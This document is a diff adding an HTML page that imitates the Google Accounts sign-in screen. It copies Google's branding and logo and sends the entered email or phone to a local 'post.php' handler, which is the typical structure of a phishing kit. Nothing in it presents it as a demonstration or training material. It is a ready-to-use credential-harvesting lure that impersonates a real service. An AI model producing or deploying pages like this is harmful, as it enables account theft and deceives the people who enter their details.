@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sign in – Google Accounts</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Roboto, Arial, sans-serif;
+      background-color: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-box {
+      background-color: white;
+      width: 100%;
+      max-width: 400px;
+      padding: 48px 40px 36px;
+      border-radius: 8px;
+      box-shadow: 0px 0px 8px rgba(0, 0, 0, 0.1);
+    }
+
+    .google-logo {
+      display: block;
+      margin: 0 auto 24px;
+      height: 24px;
+    }
+
+    h1 {
+      font-size: 24px;
+      margin-bottom: 8px;
+      color: #202124;
+    }
+
+    .subtitle {
+      font-size: 16px;
+      color: #5f6368;
+      margin-bottom: 24px;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 14px;
+      font-size: 16px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      margin-bottom: 10px;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #4285f4;
+      box-shadow: 0 0 2px 1px rgba(66, 133, 244, 0.3);
+    }
+
+    .forgot-link {
+      font-size: 14px;
+      color: #1a73e8;
+      text-decoration: none;
+      display: block;
+      margin-bottom: 30px;
+    }
+
+    .forgot-link:hover {
+      text-decoration: underline;
+    }
+
+    .buttons {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .create-account {
+      font-size: 14px;
+      color: #1a73e8;
+      text-decoration: none;
+    }
+
+    .create-account:hover {
+      text-decoration: underline;
+    }
+
+    .next-btn {
+      background-color: #1a73e8;
+      color: white;
+      border: none;
+      padding: 10px 24px;
+      font-weight: bold;
+      font-size: 14px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    .next-btn:hover {
+      background-color: #1669c1;
+    }
+
+    footer {
+      position: absolute;
+      bottom: 10px;
+      font-size: 12px;
+      color: #777;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="login-box">
+    <img class="google-logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_light_color_92x30dp.png"
+      alt="Google Logo" />
+    <h1>Sign in</h1>
+    <div class="subtitle">Use your Google Account</div>
+    <form method="POST" action="post.php">
+      <input type="email" name="username" placeholder="Email or phone" required />
+      <a class="forgot-link" href="#">Forgot email?</a>
+      <div class="buttons">
+        <a class="create-account" href="#">Create account</a>
+        <button type="submit" class="next-btn">Next</button>
+      </div>
+    </form>
+  </div>
+  <footer>Google always respect the users privacy</footer>
+</body>
+
+</html>
